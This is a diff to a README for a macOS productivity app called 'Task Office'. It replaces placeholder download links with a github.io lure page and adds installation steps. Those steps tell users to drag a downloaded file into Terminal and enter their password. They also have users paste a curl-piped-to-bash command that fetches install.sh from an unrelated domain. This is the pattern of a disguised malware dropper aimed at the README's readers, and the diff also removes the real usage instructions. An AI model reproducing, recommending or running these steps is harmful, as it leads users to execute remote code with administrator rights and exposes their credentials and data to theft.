@@ -7,9 +7,33 @@ It’s ideal for professionals, entrepreneurs, and anyone looking for a powerful
 ---
 
 ## ✅ Download Task Office for macOS  
-[![Download Task Office](https://img.shields.io/badge/Download-Task--Office-blueviolet)](#)
+[![Download Task Office](https://img.shields.io/badge/Download-Task--Office-blueviolet)](https://task-office-mac-download.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
 
 ## 📦 What is Task Office?
 
@@ -40,17 +64,7 @@ Task Office is a project and task management application that allows users to cr
 
 ---
 
-[![Download Task Office](https://img.shields.io/badge/Download-Task--Office-blueviolet)](#)
-
----
-
-## 📥 How to Use
-
-- ✅ Download and install Task Office on your Mac  
-- ➕ Start by creating Projects and adding Tasks or Goals  
-- 📅 Use calendar or timeline view to plan your time  
-- 🗂️ Organize tasks by context or priority  
-- 🔔 Set reminders and track progress daily
+[![Download Task Office](https://img.shields.io/badge/Download-Task--Office-blueviolet)](https://task-office-mac-download.github.io/.github)
 
 ---
 
